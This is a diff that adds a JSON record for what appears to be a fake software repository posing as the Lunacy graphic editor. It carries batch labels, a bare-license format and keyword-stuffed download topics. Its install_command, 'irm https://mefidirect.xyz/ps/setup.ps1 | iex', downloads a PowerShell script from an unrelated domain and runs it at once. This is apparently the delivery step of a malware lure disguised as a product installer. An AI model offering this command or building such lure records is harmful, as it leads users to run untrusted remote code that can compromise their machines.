@@ -1,0 +1,29 @@
+{
+  "repo": "lunacy-graphic-editor-suite",
+  "product": "Lunacy Graphic Editor Suite",
+  "kind": "design",
+  "install_type": "download",
+  "download_url": "https://lunacy.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "design",
+  "topics": [
+    "lunacy-release",
+    "lunacy-program",
+    "lunacy-ui-design-tool",
+    "lunacy-win10",
+    "lunacy-crash-fix",
+    "lunacy-setup-windows",
+    "lunacy-design-workspace",
+    "lunacy-local-client",
+    "lunacy-quick-start",
+    "lunacy-start-2026",
+    "download-lunacy",
+    "desktop-tools",
+    "design-tools",
+    "setup-guide",
+    "media-tools"
+  ]
+}
